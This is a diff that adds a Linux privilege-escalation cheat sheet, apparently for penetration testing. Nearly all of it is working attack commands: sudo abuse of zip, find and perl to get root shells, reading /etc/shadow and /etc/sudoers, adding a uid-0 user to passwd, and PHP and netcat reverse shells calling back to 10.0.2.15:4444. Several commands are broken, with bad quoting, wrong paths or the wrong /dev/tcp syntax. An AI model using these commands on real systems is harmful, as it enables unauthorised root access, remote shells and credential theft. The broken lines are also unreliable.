@@ -1,0 +1,109 @@
+Running commands with zip
+
+sudo -u root zip /path-to-zip-file /path-to-output -T --unzip-command="sh -c /bin/bash"
+
+=======================================================================
+
+Spawning a shell through python
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+=======================================================================
+
+Find binaries that have suid bit set (root)
+
+find / -perm -u=s -type f 2>/dev/null
+
+=======================================================================
+
+Set what a user has on target with regards to permissions
+
+find / -group [user] 2>/dev/null
+
+=======================================================================
+
+Find super users and what they can do
+
+cat /etc/sudoers
+
+=======================================================================
+
+Create encoded password to add /etc/password manually
+
+Execute this on your Kali Linux
+
+perl -le 'print crypt("password","aa")'
+
+This will give you a hash, you will copy hash and run this on target machine:
+
+echo "username:<hash copied>:0:0:username:/root:/bin/bash" >> passwd
+
+=======================================================================
+
+Use 'awk' to execute system commands
+
+awk 'BEGIN {system("commmand")}'
+
+=======================================================================
+
+Use python to execute system comamnds
+
+python -c 'import os; os.system("commmmand")'
+
+=======================================================================
+
+Escalate privilage with find command
+
+sudo find /home -exec /bin/bash \;
+
+=======================================================================
+
+Escalate privilage with perl
+
+sudo perl -e 'exec' "bin/bash/";'
+
+=======================================================================
+
+Hex dump of shadow file
+
+xxd /etc/shadow | xxd -r
+
+=======================================================================
+
+Trick ways to exploit PHP local file inclusion
+
+https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md
+
+=======================================================================
+
+LinEnum
+
+wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+git clone https://github.com/rebootuser/LinEnum.git
+
+=======================================================================
+
+php-one liners
+
+php -r '$sock=fsockopen("10.0.2.15",4444);exec("/bin/sh -i <&3 >&3 2>&3");"
+
+<? php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15:4444 0>&1'"); ?>
+
+<?php -r '$sock=fsockopen("10.0.2.15",4444);exec("/bin/sh -i <&3 >&3 2>&3");' ?>
+
+netcat one liner
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 4444 >/tmp/f
+
+=======================================================================
+
+find / -user xxx
+
+find what kind of files does xxx user have permissions on
+
+=======================================================================
+
+sudo -l
